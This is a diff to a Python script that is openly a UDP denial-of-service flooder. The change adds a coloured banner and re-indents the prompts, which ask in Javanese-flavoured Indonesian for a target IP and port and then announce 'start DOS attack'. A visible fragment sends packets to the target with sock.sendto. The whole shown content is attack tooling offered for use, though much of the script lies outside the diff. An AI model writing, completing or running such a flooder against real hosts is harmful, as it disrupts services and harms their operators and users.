@@ -29,11 +29,13 @@ _____       ___         _____          _________    _________
 
 ═════════════════════════════════════════════════════════
 """
+faded_text = fade.fire(logo)
+print(faded_text)
 def main():
        ip = input("Monggo kangmas/mbakyu masukan IP targetnya: ")
        port = int(input("Ojo lali port juga Yo..!!: "))
-# delay = int(input('Enter interval 1~1000'))
-input('Press any key to start DOS attack on %s:%s'% (ip,port))
+       # delay = int(input('Enter interval 1~1000'))
+       input('Press any key to start DOS attack on %s:%s'% (ip,port))
 
 sock.sendto(bytes, (ip,port))
 print ("Packet sent to %s:%d" % (ip,port))
